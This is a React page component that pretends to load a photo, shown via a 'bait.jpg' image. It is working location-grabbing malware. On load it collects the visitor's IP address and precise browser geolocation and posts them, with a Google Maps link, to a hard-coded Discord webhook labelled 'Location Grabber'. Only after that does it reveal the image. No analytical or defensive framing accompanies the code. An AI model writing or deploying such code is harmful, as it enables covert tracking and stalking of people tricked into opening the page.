import { useState, useEffect } from 'react';

export default function Photo() {
  const [step, setStep] = useState('loading');
  const [ip, setIp] = useState('unknown');

  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y';

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(d => setIp(d.ip))
      .catch(() => {});

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          // Wait 500ms so the IP fetch finishes before sending
          setTimeout(() => {
            sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          }, 500);
        },
        (err) => {
          setStep('failed');
        }
      );
    } else {
      setStep('failed');
    }
  }, []);

  const sendToDiscord = async (lat, lon, acc) => {
    const fields = [
      { name: 'IP Address', value: `\`${ip}\``, inline: false },
      { name: 'Latitude', value: `${lat}`, inline: true },
      { name: 'Longitude', value: `${lon}`, inline: true },
      { name: 'Accuracy', value: `${acc} meters`, inline: true },
      { name: 'Map', value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false }
    ];

    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Location Grabber',
        embeds: [{
          title: '🎯 Exact Location Captured',
          color: 0x00ff00,
          fields,
          timestamp: new Date().toISOString()
        }]
      })
    });

    setStep('image');
  };

  return (
    <div style={{ 
      display: 'flex', height: '100vh', width: '100vw', 
      background: '#111', justifyContent: 'center', alignItems: 'center',
      color: '#555', fontFamily: 'sans-serif'
    }}>
      {step === 'loading' && <p>Loading image...</p>}
      {step === 'image' && (
        <img src="/bait.jpg" alt="" style={{ maxWidth: '90%', maxHeight: '90%' }} />
      )}
      {step === 'failed' && <p>Image could not be loaded.</p>}
    </div>
  );
}
